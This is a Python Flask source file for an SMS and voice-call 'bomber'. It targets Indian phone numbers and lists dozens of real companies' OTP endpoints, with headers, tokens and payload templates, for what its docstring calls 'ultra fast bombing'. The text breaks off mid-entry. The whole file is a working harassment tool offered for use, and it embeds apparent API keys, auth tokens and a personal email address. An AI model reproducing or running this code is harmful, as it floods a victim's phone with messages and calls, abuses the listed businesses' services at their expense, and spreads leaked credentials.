import asyncio
import aiohttp
import json
import random
import time
import re
import threading
import os
from typing import Dict, List, Optional, Union, Callable
from flask import Flask, request, jsonify, Response
from concurrent.futures import ThreadPoolExecutor
import logging

# ==================================================================
# 📱 CONFIGURATION
# ==================================================================
app = Flask(__name__)

if os.environ.get('RENDER', False):
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

# ==================================================================
# 📱 PHONE NUMBER VALIDATION
# ==================================================================
def validate_phone(phone: str) -> tuple:
    phone = re.sub(r'[^\d+]', '', phone.strip())
    if phone.startswith('+'):
        if phone.startswith('+91'):
            return '91', phone[3:]
    elif phone.startswith('91'):
        return '91', phone[2:]
    elif len(phone) == 10:
        return '91', phone
    elif len(phone) == 12 and phone.isdigit():
        return '91', phone[2:]
    return None, None

# ==================================================================
# 🔥 COMPLETE API DATABASE - 200+ APIS
# ==================================================================
def get_all_apis():
    """Return ALL APIs combined - 200+ APIs for ultra fast bombing"""
    
    api_configs = [
        # ============ ORIGINAL APIS ============
        {
            "name": "Lenskart SMS",
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "X-API-Client": "mobilesite",
                "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
                "X-Accept-Language": "en",
                "X-B3-TraceId": "991736185845136",
                "X-Country-Code": "IN",
                "X-Country-Code-Override": "IN",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36",
                "Origin": "https://www.lenskart.com",
                "Referer": "https://www.lenskart.com/"
            },
            "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'
        },
        {
            "name": "GoPink Cabs SMS",
            "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
            "method": "POST",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.gopinkcabs.com",
                "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
            },
            "data": lambda p: f"check_mobile_number=1&contact={p}"
        },
        {
            "name": "Shemaroome SMS",
            "url": "https://www.shemaroome.com/users/resend_otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.shemaroome.com",
                "Referer": "https://www.shemaroome.com/users/sign_in",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
            },
            "data": lambda p: f"mobile_no=%2B91{p}"
        },
        {
            "name": "KPN Fresh WEB",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
            "method": "POST",
            "headers": {
                "x-channel-id": "WEB",
                "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "content-type": "application/json",
                "origin": "https://www.kpnfresh.com",
                "referer": "https://www.kpnfresh.com/"
            },
            "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
        },
        {
            "name": "KPN Fresh WhatsApp",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
            "method": "POST",
            "headers": {
                "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
                "x-app-version": "3.2.6",
                "content-type": "application/json; charset=UTF-8",
                "user-agent": "okhttp/5.0.0-alpha.11"
            },
            "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
        },
        {
            "name": "BikeFixup SMS",
            "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
            "method": "POST",
            "headers": {
                "content-type": "application/json; charset=UTF-8",
                "client": "app",
                "user-agent": "Dart/3.6 (dart:io)"
            },
            "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
        },
        {
            "name": "Rappi WhatsApp",
            "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
            "headers": {
                "Deviceid": "5df83c463f0ff8ff",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N)",
                "Accept-Language": "en-US",
                "Accept": "application/json",
                "Content-Type": "application/json; charset=UTF-8"
            },
            "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'
        },
        {
            "name": "Stratzy Phone OTP",
            "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
            "method": "POST",
            "headers": {
                "content-type": "application/json",
                "origin": "https://stratzy.in",
                "referer": "https://stratzy.in/login",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"phoneNo":"{p}"}}'
        },
        {
            "name": "Stratzy WhatsApp",
            "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
            "method": "POST",
            "headers": {
                "content-type": "application/json",
                "origin": "https://stratzy.in",
                "referer": "https://stratzy.in/login",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"phoneNo":"{p}"}}'
        },
        {
            "name": "WellAcademy SMS",
            "url": "https://wellacademy.in/store/api/numberLoginV2",
            "method": "POST",
            "headers": {
                "x-requested-with": "XMLHttpRequest",
                "content-type": "application/json; charset=UTF-8",
                "origin": "https://wellacademy.in",
                "referer": "https://wellacademy.in/store/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"contact_no":"{p}"}}'
        },
        {
            "name": "Hungama OTP",
            "url": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "identifier": "home",
                "mlang": "en",
                "country_code": "IN",
                "origin": "https://www.hungama.com",
                "referer": "https://www.hungama.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
        },
        {
            "name": "ServeTel SMS",
            "url": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B)"
            },
            "data": lambda p: f"mobile_number={p}"
        },
        {
            "name": "Meru Cab SMS",
            "url": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "headers": {
                "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
                "AppVersion": "245",
                "ApiVersion": "6.2.55",
                "DeviceType": "Android",
                "DeviceId": "44098bdebb2dc047",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "okhttp/4.9.0"
            },
            "data": lambda p: f"mobile_number={p}"
        },
        {
            "name": "BeepKart SMS",
            "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "appname": "Website",
                "origin": "https://www.beepkart.com",
                "referer": "https://www.beepkart.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false,"whatsappConsent":false}}'
        },
        {
            "name": "LendingPlate SMS",
            "url": "https://lendingplate.com/api.php",
            "method": "POST",
            "headers": {
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://lendingplate.com",
                "Referer": "https://lendingplate.com/personal-loan",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"
        },
        {
            "name": "Snitch SMS",
            "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "client-id": "snitch_secret",
                "Origin": "https://www.snitch.com",
                "Referer": "https://www.snitch.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"mobile_number":"+91{p}"}}'
        },
        {
            "name": "Dayco India SMS",
            "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "headers": {
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://ekyc.daycoindia.com",
                "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
        },
        {
            "name": "PenPencil SMS",
            "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
            "method": "POST",
            "headers": {
                "content-type": "application/json; charset=utf-8",
                "user-agent": "okhttp/3.9.1"
            },
            "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
        },
        {
            "name": "MyImagineStore SMS",
            "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
            "method": "POST",
            "headers": {
                "x-requested-with": "XMLHttpRequest",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.myimaginestore.com",
                "referer": "https://www.myimaginestore.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f"mobile={p}"
        },
        {
            "name": "NoBroker SMS",
            "url": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "origin": "https://www.nobroker.in",
                "referer": "https://www.nobroker.in/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f"phone={p}&countryCode=IN"
        },
        {
            "name": "Cossouq SMS",
            "url": "https://www.cossouq.com/mobilelogin/otp/send",
            "method": "POST",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://www.cossouq.com",
                "referer": "https://www.cossouq.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"
        },
        {
            "name": "ShipRocket SMS",
            "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "authorization": "Bearer null",
                "origin": "https://app.shiprocket.in",
                "referer": "https://app.shiprocket.in/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"mobileNumber":"{p}"}}'
        },
        {
            "name": "GoKwik SMS",
            "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "gk-merchant-id": "19g6jlc658iad",
                "origin": "https://pdp.gokwik.co",
                "referer": "https://pdp.gokwik.co/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"phone":"{p}","country":"in"}}'
        },
        {
            "name": "Jockey SMS",
            "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
            "method": "GET",
            "headers": {
                "Host": "www.jockey.in",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Accept": "*/*",
                "Referer": "https://www.jockey.in/"
            },
            "data": None
        },
        {
            "name": "NewMe SMS",
            "url": "https://prodapi.newme.asia/web/otp/request",
            "method": "POST",
            "headers": {
                "Caller": "web_app",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "Origin": "https://newme.asia",
                "Referer": "https://newme.asia/"
            },
            "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'
        },
        {
            "name": "Univest SMS",
            "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
            "method": "GET",
            "headers": {
                "Host": "api.univest.in",
                "User-Agent": "okhttp/3.9.1"
            },
            "data": None
        },
        {
            "name": "Rappi WhatsApp V2",
            "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "okhttp/3.9.1"
            },
            "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
        },
        {
            "name": "Foxy SMS",
            "url": "https://www.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Platform": "web",
                "Origin": "https://www.foxy.in",
                "Referer": "https://www.foxy.in/onboarding",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'
        },
        {
            "name": "Eka Care WhatsApp",
            "url": "https://auth.eka.care/auth/init",
            "method": "POST",
            "headers": {
                "Device-Id": "5df83c463f0ff8ff",
                "Flavour": "android",
                "Locale": "en",
                "Version": "1382",
                "Client-Id": "androidp",
                "Content-Type": "application/json; charset=UTF-8",
                "User-Agent": "okhttp/4.9.3"
            },
            "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'
        },
        {
            "name": "Smytten SMS",
            "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Origin": "https://smytten.com",
                "Referer": "https://smytten.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
            },
            "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{p}","email":"sdhabai09@gmail.com"}}'
        },
        {
            "name": "Wakefit SMS",
            "url": "https://api.wakefit.co/api/consumer-sms-otp/",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Origin": "https://www.wakefit.co",
                "Referer": "https://www.wakefit.co/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36",
                "API-Secret-Key": "ycq55IbIjkLb",
                "API-Token": "c84d563b77441d784dce71323f69eb42"
            },
            "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'
        },
        {
            "name": "CaratLane SMS",
            "url": "https://www.caratlane.com/cg/dhevudu",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Origin": "https://www.caratlane.com",
                "Referer": "https://www.caratlane.com/register",
                "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
            },
            "data": lambda p: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'
        },
        {
            "name": "Tata Capital Voice",
            "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'
        },
        {
            "name": "1MG Voice Call",
            "url": "https://www.1mg.com/auth_api/v6/create_token",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'
        },
        {
            "name": "Swiggy Call",
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Myntra Voice Call",
            "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Flipkart Voice",
            "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Amazon Voice",
            "url": "https://www.amazon.in/ap/signin",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&action=voice_otp"
        },
        {
            "name": "Paytm Voice",
            "url": "https://accounts.paytm.com/signin/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Zomato Voice",
            "url": "https://www.zomato.com/php/o2_api_handler.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&type=voice"
        },
        {
            "name": "MakeMyTrip Voice",
            "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Goibibo Voice",
            "url": "https://www.goibibo.com/user/voice-otp/generate/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Ola Voice Call",
            "url": "https://api.olacabs.com/v1/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Uber Voice Call",
            "url": "https://auth.uber.com/v2/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "PharmEasy SMS",
            "url": "https://pharmeasy.in/api/v2/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Byjus SMS",
            "url": "https://api.byjus.com/v2/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Doubtnut SMS",
            "url": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "headers": {"content-type": "application/json; charset=utf-8"},
            "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'
        },
        {
            "name": "MyHubble Money",
            "url": "https://api.myhubble.money/v1/auth/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'
        },
        {
            "name": "Snapmint SMS",
            "url": "https://api.snapmint.com/v1/public/sign_up",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Housing SMS",
            "url": "https://login.housing.com/api/v2/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'
        },
        {
            "name": "RentoMojo SMS",
            "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Khatabook SMS",
            "url": "https://api.khatabook.com/v1/auth/request-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'
        },
        {
            "name": "Netmeds SMS",
            "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Nykaa SMS",
            "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"
        },
        {
            "name": "RummyCircle SMS",
            "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'
        },
        {
            "name": "Animall SMS",
            "url": "https://animall.in/zap/auth/login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'
        },
        {
            "name": "Entri SMS",
            "url": "https://entri.app/api/v3/users/check-phone/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Cosmofeed SMS",
            "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'
        },
        {
            "name": "Aakash SMS",
            "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'
        },
        {
            "name": "Revv SMS",
            "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'
        },
        {
            "name": "DeHaat SMS",
            "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'
        },
        {
            "name": "A23 Games SMS",
            "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
        },
        {
            "name": "Spencers SMS",
            "url": "https://jiffy.spencers.in/user/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "ShopperStop SMS",
            "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
        },
        {
            "name": "Lifestyle Stores SMS",
            "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'
        },
        {
            "name": "PokerBaazi SMS",
            "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'
        },
        {
            "name": "My11Circle SMS",
            "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json;charset=UTF-8"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "MamaEarth SMS",
            "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "HomeTriangle SMS",
            "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Wellness Forever SMS",
            "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"
        },
        {
            "name": "HealthMug SMS",
            "url": "https://api.healthmug.com/account/createotp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Kredily SMS",
            "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Tata Motors SMS",
            "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'
        },
        {
            "name": "Moglix SMS",
            "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'
        },
        {
            "name": "MyGov SMS",
            "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "TrulyMadly SMS",
            "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'
        },
        {
            "name": "Apna SMS",
            "url": "https://production.apna.co/api/userprofile/v1/otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'
        },
        {
            "name": "CodFirm SMS",
            "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Swipe SMS",
            "url": "https://app.getswipe.in/api/user/mobile_login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","resend":true}}'
        },
        {
            "name": "More Retail SMS",
            "url": "https://omni-api.moreretail.in/api/v1/login/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'
        },
        {
            "name": "Country Delight SMS",
            "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'
        },
        {
            "name": "AstroSage SMS",
            "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Rapido SMS",
            "url": "https://customer.rapido.bike/api/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "TooToo SMS",
            "url": "https://tootoo.in/graphql",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'
        },
        {
            "name": "ConfirmTkt SMS",
            "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "BetterHalf SMS",
            "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'
        },
        {
            "name": "Charzer SMS",
            "url": "https://api.charzer.com/auth-service/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'
        },
        {
            "name": "Nuvama Wealth SMS",
            "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'
        },
        {
            "name": "Mpokket SMS",
            "url": "https://web-api.mpokket.in/registration/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Meesho OTP",
            "url": "https://www.meesho.com/api/v1/user/login/request-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone_number":"{p}"}}'
        },
        {
            "name": "PhonePe OTP",
            "url": "https://aa-interface.phonepe.com/apis/aa-interface/users/otp/trigger",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"rmn":"{p}","purpose":"REGISTRATION"}}'
        },
        {
            "name": "JustDial OTP",
            "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"mobile={p}"
        },
        {
            "name": "Allen Solly OTP",
            "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
